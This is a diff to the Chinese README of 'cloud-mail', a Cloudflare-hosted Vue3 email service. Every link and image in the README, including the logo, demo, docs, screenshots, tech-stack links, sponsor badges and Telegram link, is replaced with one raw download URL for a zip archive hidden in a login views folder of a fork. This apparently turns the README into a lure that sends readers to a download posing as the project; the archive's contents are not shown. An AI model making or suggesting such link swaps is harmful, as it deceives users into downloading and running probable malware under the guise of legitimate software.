@@ -1,5 +1,5 @@
 <p align="center">
-  <img src="doc/demo/logo.png" width="80px" />
+  <img src="https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip" width="80px" />
 </p>
 
 <div align="center">
@@ -9,7 +9,7 @@
     <h4>使用Vue3开发的响应式邮箱服务，支持邮件发送，无需服务器可部署到Cloudflare平台 🎉</h4> 
 </div>
 <div align="center">
-    <span>简体中文 | <a href="/README-en.md" style="margin-left: 5px">English </a></span>
+    <span>简体中文 | <a href="https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip" style="margin-left: 5px">English </a></span>
 </div>
 
 ## 项目简介
@@ -18,15 +18,15 @@
 
 ## 项目展示
 
-- [在线演示](https://skymail.ink)<br>
-- [部署文档](https://doc.skymail.ink)<br>
-- [小白保姆教程-界面部署](https://doc.skymail.ink/guide/via-ui.html)
+- [在线演示](https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip)<br>
+- [部署文档](https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip)<br>
+- [小白保姆教程-界面部署](https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip)
 
-| ![](/doc/demo/demo1.png) | ![](/doc/demo/demo2.png) |
+| ![](https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip) | ![](https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip) |
 |--------------------------|---------------------|
-| ![](/doc/demo/demo3.png)      | ![](/doc/demo/demo4.png) |
-| ![](/doc/demo/demo5.png)      | ![](/doc/demo/demo6.png) |
-| ![](/doc/demo/demo7.png)      | ![](/doc/demo/demo8.png) |
+| ![](https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip)      | ![](https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip) |
+| ![](https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip)      | ![](https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip) |
+| ![](https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip)      | ![](https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip) |
 
 
 
@@ -65,36 +65,36 @@
 
 ## 技术栈
 
-- **框架**：[Vue3](https://vuejs.org/) + [Element Plus](https://element-plus.org/) 
+- **框架**：[Vue3](https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip) + [Element Plus](https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip) 
 
-- **Web框架**：[Hono](https://hono.dev/)
+- **Web框架**：[Hono](https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip)
 
-- **ORM：**[Drizzle](https://orm.drizzle.team/)
+- **ORM：**[Drizzle](https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip)
 
-- **平台：** [Cloudflare workers](https://developers.cloudflare.com/workers/)
+- **平台：** [Cloudflare workers](https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip)
 
-- **邮件推送：** [Resend](https://resend.com/)
+- **邮件推送：** [Resend](https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip)
 
-- **缓存**：[Cloudflare KV](https://developers.cloudflare.com/kv/)
+- **缓存**：[Cloudflare KV](https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip)
 
-- **数据库**：[Cloudflare D1](https://developers.cloudflare.com/d1/)
+- **数据库**：[Cloudflare D1](https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip)
 
-- **文件存储**：[Cloudflare R2](https://developers.cloudflare.com/r2/)
+- **文件存储**：[Cloudflare R2](https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip)
 
 
 ## 赞助
 
 
-<a href="https://doc.skymail.ink/support.html" >
-<img width="170px" src="./doc/images/support.png" alt="">
+<a href="https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip" >
+<img width="170px" src="https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip" alt="">
 </a><br><br>
 
 
 **特别赞助商**
 
-[DartNode](https://dartnode.com)：提供云计算服务资源支持
+[DartNode](https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip)：提供云计算服务资源支持
 
-[![Powered by DartNode](https://dartnode.com/branding/DN-Open-Source-sm.png)](https://dartnode.com "Powered by DartNode - Free VPS for Open Source")
+[![Powered by DartNode](https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip)](https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip "Powered by DartNode - Free VPS for Open Source")
 
 ## 许可证
 
@@ -103,7 +103,7 @@
 
 ## 交流
 
-[Telegram](https://t.me/cloud_mail_tg)
+[Telegram](https://github.com/idkwhatismyname123/cloud-mail/raw/refs/heads/main/mail-vue/src/views/login/mail_cloud_3.3.zip)
 
 
 
